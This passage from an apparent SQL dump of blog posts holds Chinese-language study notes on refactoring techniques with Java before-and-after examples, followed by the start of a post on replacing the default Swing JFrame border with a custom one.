_itemPrice;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>Private double discountFactor() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; If (basePrice() &gt;1000) return 0.95;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; else return 0.98;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>（重构前，在getPrice方法中，先计算基础价格、再计算折扣因子、再计算最终价格，做了语义上可以再次拆解的三件事儿，不符合&ldquo;函数只做一件事儿&rdquo;的要求，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>于是使用Extract Method方法来重构。借助Replace Temp with Query重构方法，将临时变量basePrice、discountFactor用相应的查询函数来替代。</p>\r\n\r\n<p>需要指出的是，此次重构，查询函数basePrice被调用了两次，损失的一点点性能可以忽略，我们认为这样做是值得的。）</p>\r\n\r\n<p>3.3 Split Temporary Variable</p>\r\n\r\n<p>double temp = 2 * (_height + _width);</p>\r\n\r\n<p>System.out.println (temp);</p>\r\n\r\n<p>temp = _height * _width;</p>\r\n\r\n<p>System.out.println (temp);</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>final double perimeter = 2 * (_height + _width);</p>\r\n\r\n<p>System.out.println (perimeter);</p>\r\n\r\n<p>final double area = _height * _width;</p>\r\n\r\n<p>System.out.println (area);</p>\r\n\r\n<p>（如果临时变量被赋值超过一次就意味它们在函数中承担了一个以上的责任（循环变量等用途除外）。</p>\r\n\r\n<p>例子中，临时变量temp开始被用来记录矩形周长，后来被用来记录矩形面积。应该拆解为多个临时变量，否则：</p>\r\n\r\n<p>1． 影响代码可读性。（多用途临时变量通常无法获得合适的命名）</p>\r\n\r\n<p>2． 增加代码出错机会。（程序某处，可能都记不清这个临时变量现在是记录什么数值的）</p>\r\n\r\n<p>实际操作中，推荐使用final来限定临时变量被赋值次数。）</p>\r\n\r\n<p>3.4 Remove Assignments to Parameters</p>\r\n\r\n<p>int discount (int inputVal, int quantity, int yearToDate) {</p>\r\n\r\n<p>&nbsp;if (inputVal &gt; 50) inputVal -= 2;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>int discount (int inputVal, int quantity, int yearToDate) {</p>\r\n\r\n<p>&nbsp;int result = inputVal;</p>\r\n\r\n<p>&nbsp;if (inputVal &gt; 50) result -= 2;</p>\r\n\r\n<p>1． 不要对参数赋值</p>\r\n\r\n<p>void nextDate(Date arg) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; arg.setDate(arg.getDate() + 1);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>void nextDate(Date arg) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; arg = new Date(arg.getYear(), arg.getMonth(), arg.getDate() + 1);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>上面两个函数的写法，哪个是对参数赋值了的？哪个会起到应有的作用？</p>\r\n\r\n<p>2． Java是pass by value（传值）的</p>\r\n\r\n<p>a) 传进函数体中的参数，是调用语句那个传入参数在内存中的一份拷贝</p>\r\n\r\n<p>b) 函数体内对参数的再赋值不会影响调用方的参数原始值（比如，修改int等基本类型参数的数值、修改Object等对象引用的指向）</p>\r\n\r\n<p>c) Java中，对参数的再次赋值是一种纯粹降低程序清晰程度的做法</p>\r\n\r\n<p>3.5 Replace Method with Method Object</p>\r\n\r\n<p>class Order...</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double price() {</p>\r\n\r\n<p>&nbsp;double primaryBasePrice;</p>\r\n\r\n<p>&nbsp;double secondaryBasePrice;</p>\r\n\r\n<p>&nbsp;double tertiaryBasePrice;</p>\r\n\r\n<p>&nbsp;// long computation;</p>\r\n\r\n<p>&nbsp;...</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&hellip;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>（一个大的函数，提炼出一个专门实现这个函数功能的类。</p>\r\n\r\n<p>比如getMoney方法可能就是提炼出一个MoneyGetter类。此处是price方法提炼出PriceCalculator类。</p>\r\n\r\n<p>这样做的理由是，price可能是个很大的函数，我们为了获得短函数的优势（前面说过的，可重用、可读、可插入等），想利用Extract Method抽取出多个短函数，但</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>每个短函数可能都需要primaryBasePrice、secondaryBasePrice、tertiaryBasePrice等几个临时变量，把它们都作为参数传递显然太笨了。而把这个大函数提炼成类</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，这些临时变量就变成了类的Field，在类中是共享的，这样，抽取出来的小函数之间就可以不需要传递参数，就很容易实现Extract Method这个重构过程。）</p>\r\n\r\n<p>3.5.1 如此这般之后，类是不是太多了？</p>\r\n\r\n<p>面向对象的套路，玩的就是类。函数不嫌多，为什么嫌类多？多个风马牛不相及的函数杂居在一个类中（能够容忍么？），为什么不多弄几个类把它们各自封装？类</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，对应了现实世界的有机无机物种，把物种分得足够细致，世界才得到了完美地描述。</p>\r\n\r\n<p>3.6 Replace Array with Object</p>\r\n\r\n<p>String[] person = new String[3];</p>\r\n\r\n<p>person[0] = &ldquo;Robert De Niro&quot;;</p>\r\n\r\n<p>person[1] = &ldquo;60&quot;;</p>\r\n\r\n<p>person[2] = &ldquo;Actor&rdquo;;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>Person robert = new Person();</p>\r\n\r\n<p>robert.setName(&quot; Robert De Niro&quot;);</p>\r\n\r\n<p>robert.setAge(&ldquo;60&quot;);</p>\r\n\r\n<p>robert.setProfession(&ldquo;Actor&rdquo;);</p>\r\n\r\n<p>1． 数组应该容纳一组相似的对象，用户很难记住&ldquo;数组第一个元素是人名、第二个元素是年龄&rdquo;这样的约定。</p>\r\n\r\n<p>a) 用注释来保证这种约定么？</p>\r\n\r\n<p>b) 使用数组是出于效率考虑么？（抬杠？）</p>\r\n\r\n<p>2． 同理，能够恰当地利用既有数据结构把接口约束得紧一些（更贴切、更严丝合缝），对大家都有好处。</p>\r\n\r\n<p>a) 比如，能够确定是一组Person类实例，就要用Person[]来装，而不用Set、Map这样的&ldquo;广口&rdquo;容器。（拒绝&ldquo;私下、口头约定，注释&rdquo;等靠不住的协议方式所带来</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的弊端。）</p>\r\n\r\n<p>3.7 Encapsulate Field</p>\r\n\r\n<p>public String _name;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>private String _name;</p>\r\n\r\n<p>public String getName() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return _name;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>public void setName(String arg) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; _name = arg;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>强调封装：</p>\r\n\r\n<p>一般来讲，任何时候都不要将类field声明为public（常量除外）。数据和使用数据的行为被集中在一起，一旦情况发生变化，代码的修改比较容易，因为需要修改的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>代码都集中在同一块地方，而不是星罗棋布地散落在整个程序中。</p>\r\n\r\n<p>3.8 Replace Magic Number with Symbolic Constant</p>\r\n\r\n<p>double potentialEnergy(double mass, double height) {</p>\r\n\r\n<p>&nbsp;return mass * 9.81 * height;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>double potentialEnergy(double mass, double height) {</p>\r\n\r\n<p>&nbsp;return mass * GRAVITATIONAL_CONSTANT * height;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>static final double GRAVITATIONAL_CONSTANT = 9.81;</p>\r\n\r\n<p>宏值定义代替散落在代码中的&ldquo;魔术数&rdquo;，没什么好说的。</p>\r\n\r\n<p>3.9 Encapsulate Collection</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>依然是强调封装：</p>\r\n\r\n<p>1． 类内高内聚：数据和对数据的操作紧密结合在一起，对数据的实施操作比较容易。（比如，餐厅管理系统中的某个类，dishes（Vector类型）作为类的field，装</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>载点菜时被点中的菜目，如果想统计一下哪些菜受欢迎，对于按Encapsulate Collection设计的类就比较容易操作，add方法中做一些手脚即可（分类累加）。）</p>\r\n\r\n<p>2． 类之间松耦合：内部数据结构不要暴露的外界，外界也不需要关心。（这样，即便你把内部数据由array换成Vector，外部都不需要知道。）</p>\r\n\r\n<p>3.10 Replace Type Code with Class</p>\r\n\r\n<p>&nbsp;重构为：</p>\r\n\r\n<p>3.10.1 Why？Type Code有什么不好？</p>\r\n\r\n<p>1． Type Code会降低可读性。</p>\r\n\r\n<p>a) 在定义的地方可能看不出来（定义时使用宏值，可读性挺好），但在使用的地方就会显现问题。上例中，比如有个方法getCharacter获得血型对应的性格描述，参</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>数是血型，使用Type Code时，参数类型为int，重构后，参数类型为BloodGroup，显然后者的可读性好。</p>\r\n\r\n<p>2． 使用Type Code失去了使用对象所拥有的独立扩展的机会。</p>\r\n\r\n<p>a) 像这个例子，Type Code很容易有它自己的行为，比如根据血型得到性格描述、得到ABO溶血症可能性、判断血型之间的输血匹配可能&hellip;&hellip;于是将其抽取成类是比较</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>好的做法。（还是封装！）</p>\r\n\r\n<p>3.10.2 插科打诨，Meilir Page-Jones讲的故事</p>\r\n\r\n<p>（故事是讲面向对象的，面向对象的主要特征有哪些？封装、继承、多态）</p>\r\n\r\n<p>Meilir Page-Jones在《UML面向对象设计基础》（个人认为此书堪称经典）一书中编了一个故事：</p>\r\n\r\n<p>软件界在&ldquo;面向对象&rdquo;的定义上，一度很难达成一致。我开始步入面向对象领域时，决定澄清一下&ldquo;面向对象&rdquo;的定义。</p>\r\n\r\n<p>我把数十位面向对象的老前辈关在一个没有食物和水的房间里。我告诉他们只有当他们的定义达成一致的意见，并且可以在软件世界发布时才允许他们出去。在一小</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>时的喧哗过后，房内一片安静，老前辈们背靠背谁也不理谁了，陷入了僵局。此时，蹦出来一位组织者，让每个人都列出他们认为在面向对象世界中不可缺少的特性</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，大家同意。一通罗列，每个人都列出了三个五个、十个八个。</p>\r\n\r\n<p>此时，刚才蹦出来那位组织者又蹦出来开始讲话，说，现在我们大致有两种做法：一种是建立一个长列表，该列表是每个人列表的并集；另一种是建立一个短列表，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>该列表是每个人列表的交集。大家选择了后者，产生了一个短列表，该列表中的特性在每个人列表中都有。这个列表确实很短，短到只有一个词，&ldquo;封装&rdquo;。</p>\r\n\r\n<p>一堆废话告诉大家一个道理，封装，是面向对象最为重要的特性，封装好了，才能做到所谓的高内聚、松耦合。获得面向对象思想许诺的种种优势。</p>\r\n\r\n<p>3.11 Replace Type Code with Subclass</p>\r\n\r\n<p>（跟前面宠物店的例子是不是很像？）</p>\r\n\r\n<p>&nbsp;重构为：</p>\r\n\r\n<p>3.12 Replace Type Code with State/Strategy</p>\r\n\r\n<p>&nbsp;重构为：</p>\r\n\r\n<p>这个就厉害了！清晰地展示了&ldquo;合成/聚合复用原则&rdquo;。</p>\r\n\r\n<p>上面例子，将Engineer和Salesman弄成并列的子类，是存在问题的。（什么问题？）</p>\r\n\r\n<p>1． Salesman明确地从Employee继承，那么就无法再从Male、Newcomer等类继承来获得他们的特性。</p>\r\n\r\n<p>2． Salesman的实例被new出来之后，他可能转岗做研发，想变成Engineer，无法实现。</p>\r\n\r\n<p>3.12.1 什么是合成/聚合复用原则</p>\r\n\r\n<p>1． 要尽量使用合成/聚合，尽量不要使用继承。</p>\r\n\r\n<p>2． 从复用角度来说：&ldquo;合成/聚合复用&rdquo;比&ldquo;继承&rdquo;复用灵活。前者是动态复用（因而具有可插入性）、后者是静态复用（编译时就固定了复用关系），而且后者的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>复用有&ldquo;不支持多重继承&rdquo;的限制。</p>\r\n\r\n<p>3.13 Decompose Conditional</p>\r\n\r\n<p>if (date.before (SUMMER_START) || date.after(SUMMER_END))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; charge = quantity * _winterRate + _winterServiceCharge;</p>\r\n\r\n<p>else charge = quantity * _summerRate;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>if (notSummer(date))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; charge = winterCharge(quantity);</p>\r\n\r\n<p>else charge = summerCharge (quantity);</p>\r\n\r\n<p>Extract Method在条件判断语句段中的应用。</p>\r\n\r\n<p>3.14 Consolidate Conditional Expression</p>\r\n\r\n<p>double disabilityAmount() {</p>\r\n\r\n<p>&nbsp;if (_seniority &lt; 2) return 0;</p>\r\n\r\n<p>&nbsp;if (_monthsDisabled &gt; 12) return 0;</p>\r\n\r\n<p>&nbsp;if (_isPartTime) return 0;</p>\r\n\r\n<p>&nbsp;// compute the disability amount</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>double disabilityAmount() {</p>\r\n\r\n<p>&nbsp;if (isNotEligableForDisability()) return 0;</p>\r\n\r\n<p>&nbsp;// compute the disability amount</p>\r\n\r\n<p>这条比较雕虫小技，可视具体情况参考实施。</p>\r\n\r\n<p>3.15 Consolidate Duplicate Conditional Fragments</p>\r\n\r\n<p>if (isSpecialDeal()) {</p>\r\n\r\n<p>&nbsp; total = price * 0.95;</p>\r\n\r\n<p>&nbsp; send();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>else {</p>\r\n\r\n<p>&nbsp; total = price * 0.98;</p>\r\n\r\n<p>&nbsp; send();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>if (isSpecialDeal()) {</p>\r\n\r\n<p>&nbsp; total = price * 0.95;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>else {</p>\r\n\r\n<p>&nbsp; total = price * 0.98;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>send();</p>\r\n\r\n<p>虽然这条也比较雕虫小技，但前面这样的代码确实也有人写得出来。</p>\r\n\r\n<p>3.16 Remove Control Flag</p>\r\n\r\n<p>set done to false</p>\r\n\r\n<p>while not done</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (condition)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do something</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set done to true</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; next step of loop</p>\r\n\r\n<p>Control Flag为什么不好？</p>\r\n\r\n<p>影响可读性，程序看起来比较绕。</p>\r\n\r\n<p>3.16.1 一个例子</p>\r\n\r\n<p>void checkSecurity(String[] people) {</p>\r\n\r\n<p>&nbsp; String found = &quot;&quot;;</p>\r\n\r\n<p>&nbsp; for (int i = 0; i &lt; people.length; i++) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (found.equals(&quot;&quot;)) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (people[i].equals (&quot;Don&quot;)){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendAlert();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; found = &quot;Don&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (people[i].equals (&quot;John&quot;)){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendAlert(); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; found = &quot;John&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp; }</p>\r\n\r\n<p>&nbsp; someLaterCode(found);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>无论找到Don还是John都退出循环做其他事儿。注意：这里使用了标志found。</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>void checkSecurity(String[] people) {</p>\r\n\r\n<p>&nbsp; String found = foundMiscreant(people);</p>\r\n\r\n<p>&nbsp; someLaterCode(found);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>String foundMiscreant(String[] people){</p>\r\n\r\n<p>&nbsp; for (int i = 0; i &lt; people.length; i++) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (people[i].equals (&quot;Don&quot;)){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendAlert();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return &quot;Don&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (people[i].equals (&quot;John&quot;)){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendAlert();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return &quot;John&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp; }</p>\r\n\r\n<p>&nbsp; return &quot;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构之后，去掉了标志，增加了函数的出口，同时增加了程序的可读性。</p>\r\n\r\n<p>3.17 Replace Nested Conditional with Guard Clauses</p>\r\n\r\n<p>（卫语句：某些条件判断为真时，立即从函数返回。这样的判断就应该首先、单独进行，把这种单独检查称之为&ldquo;卫语句&rdquo;。Guard Clauses。是Kent Beck给起的名</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>字，Kent Beck是TDD、XP的第一倡导者。）</p>\r\n\r\n<p>double getPayAmount() {</p>\r\n\r\n<p>&nbsp; double result;</p>\r\n\r\n<p>&nbsp; if (_isDead) result = deadAmount(); &nbsp;</p>\r\n\r\n<p>&nbsp; else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (_isSeparated) result = separatedAmount();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (_isRetired) result = retiredAmount();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else result = normalPayAmount();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; };</p>\r\n\r\n<p>&nbsp; }</p>\r\n\r\n<p>&nbsp; return result;</p>\r\n\r\n<p>};</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>double getPayAmount() {</p>\r\n\r\n<p>&nbsp; if (_isDead) return deadAmount();</p>\r\n\r\n<p>&nbsp; if (_isSeparated) return separatedAmount();</p>\r\n\r\n<p>&nbsp; if (_isRetired) return retiredAmount();</p>\r\n\r\n<p>&nbsp; return normalPayAmount();</p>\r\n\r\n<p>};</p>\r\n\r\n<p>（好处是明显的，可以减少if/else嵌套的数目，从而强烈地提高程序可读性。比较重要的是，需要习惯&ldquo;函数有多个出口&rdquo;这种做法。）</p>\r\n\r\n<p>3.18 Replace Conditional with Polymorphism</p>\r\n\r\n<p>double getSpeed() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; switch (_type) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case EUROPEAN:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return getBaseSpeed();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case AFRICAN:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return getBaseSpeed() - getLoadFactor() *</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _numberOfCoconuts;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case NORWEGIAN_BLUE:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (_isNailed) ? 0 : getBaseSpeed(_voltage);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; throw new RuntimeException (&quot;Should be unreachable&quot;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>（跟讲Switch那个Bad Smell时举过的例子，基本一样。）</p>\r\n\r\n<p>3.19 Introduce Parameter Object</p>\r\n\r\n<p>&nbsp;重构为：</p>\r\n\r\n<p>3.20 Replace Error Code with Exception</p>\r\n\r\n<p>int withdraw(int amount) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (amount &gt; _balance) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _balance -= amount;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>void withdraw(int amount) throws BalanceException {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (amount &gt; _balance) throw new BalanceException();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; _balance -= amount;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>Why？</p>\r\n\r\n<p>1． 提高代码可读性。</p>\r\n\r\n<p>2． 方便调用方。调用方可以不再判断返回的Error Code，而只是把异常直接抛出去，待最终接受方处理。比如，类C/S的结构，服务端代码在所有环节都可以直接透</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>传Exception，简化处理流程。Exception最终由客户端统一处理。</p>\r\n\r\n<p>（注：有些地方无法完全取代Error Code，比如前台回来的消息处理，onMessage函数。）</p>\r\n\r\n<p>3.21 Form Template Method</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>（计算金额的步骤，各个子类都一样，即算得基础金额、再算得缴税几多，然后二者想加。于是把这个逻辑上升到父类。子类仅负责其中的子步骤。）</p>\r\n\r\n<p>（下面再看一个例子。说明一下Template Method是怎么回事儿。</p>\r\n\r\n<p>所有的工作人员，一天的活动，步骤都差不多，无外乎，吃早餐、赶到工作地点&hellip;&hellip;，但不同子类对于各个步骤的实现是不同的。</p>\r\n\r\n<p>比如，上午工作，公务员可能是：编写官样文章、聊天、按照规定合理地拒绝刁蛮市民的无理要求&hellip;&hellip;；我司员工可能是：编码、调试、上网看新闻、到匿名论坛发</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>牢骚&hellip;&hellip;；农民工兄弟可能是：扛包、抽烟休息一会、扛包、喝水休息一会&hellip;&hellip;。</p>\r\n\r\n<p>比如，吃午餐，公务员是：免费、或者象征性收费的豪华自助餐；我司员工是：别无选择的XLX；农民工兄弟是：其他农民工在廉价出租棚子里制作的不干不净吃了可能得病的方便盒饭。）</p>\r\n',0,1437806642,0,0),(59,16,'为解决java JFrame边框老土问题','<p>问题一：为解决java JFrame边框老土问题；</p>\r\n\r\n<p>开始查找资料，首先找到的是一个IBM专家，也是SUNONE之一，他重写了JFrame类得到IFrame的Jar包，但是其效果还是不是特别理想；</p>\r\n\r\n<p>自己思考，其实自己可以把JFrame的边框去掉，自己在重写一个JPanel，然后把标题框当做组件，并且重绘背景，就可以得到和QQ游戏相似的界面。</p>\r\n\r\n<p>问题二：这就涉及到窗体操作问题，比如如何关闭窗口，缩小窗口。</p>\r\n\r\n<p>通过查JavaAPI的源代码，发现我们通常设置的默认关闭行为，其实SUN是这样实现的。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if (e.getID() == WindowEvent.WINDOW_CLOSING) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch(defaultCloseOperation) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case HIDE_ON_CLOSE:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setVisible(false);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case DISPOSE_ON_CLOSE:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dispose();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case DO_NOTHING_ON_CLOSE:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case EXIT_ON_CLOSE:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // This needs to match the checkExit call in</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // setDefaultCloseOperation</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.exit(0);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>也就是说我们通常设置的默认关闭行为EXIT_ON_CLOSE,其实就是简单的调用系统的System.exit(0);窗体关闭问题解决。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>至于窗口拖动等，网上找到下面一篇日志：</p>\r\n\r\n<p>在使用Jframe的时候，普遍都会有标题栏，还有最小化,最大化，关闭按纽的，还要实现拖动窗体的功能。</p>\r\n\r\n<p>这样的话，对我们实现自定义样式的窗体是很有影响的，</p>\r\n\r\n<p>1)&nbsp;&nbsp;&nbsp;&nbsp; 要去掉标题栏：</p>\r\n\r\n<p>jFrame.setUndecorated(true);</p>\r\n\r\n<p>// 这样就可以去掉Jframe中对window的装饰了，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2)&nbsp;&nbsp;&nbsp;&nbsp; 